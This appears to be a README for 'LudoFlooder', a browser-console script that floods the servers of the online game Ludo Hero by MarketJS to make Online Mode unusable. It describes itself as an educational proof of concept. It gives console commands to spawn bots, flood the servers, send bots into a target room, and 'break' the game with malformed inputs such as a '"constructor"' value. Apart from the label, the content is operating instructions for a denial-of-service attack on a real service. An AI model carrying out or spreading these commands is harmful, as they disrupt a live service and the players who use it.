# LudoFlooder
*educational PoC*

A tool that floods **Ludo Hero by MarketJS** servers, making Online Mode unusable.

[Get the script here](/script.js)

#### Paste the script into the DevTools console and read how to use it:

First, spawn the bots (for example, 10 of them):
```js
ludo.spawnBots(10)
```

Once initialization is complete, we can flood the servers:
```js
ludo.autoFlood("name here")
```

This stops the flood:
```js
ludo.stopFlood()
```

This terminates all the bots:
```js
ludo.terminateBotSessions()
```

This targets a room and tries to make the bots join it:
```js
ludo.deployBotsToRoom("name", roomId)
```

This removes the bots from the room, useful if they are stuck in one:
```js
ludo.removeBotsFromRoom()
```

## Game breakers

This breaks the game:
```js
ludo.autoFlood("lol", '"constructor"')
```

This makes the game creepy!
```js
ludo.autoFlood("lol", 666)
```
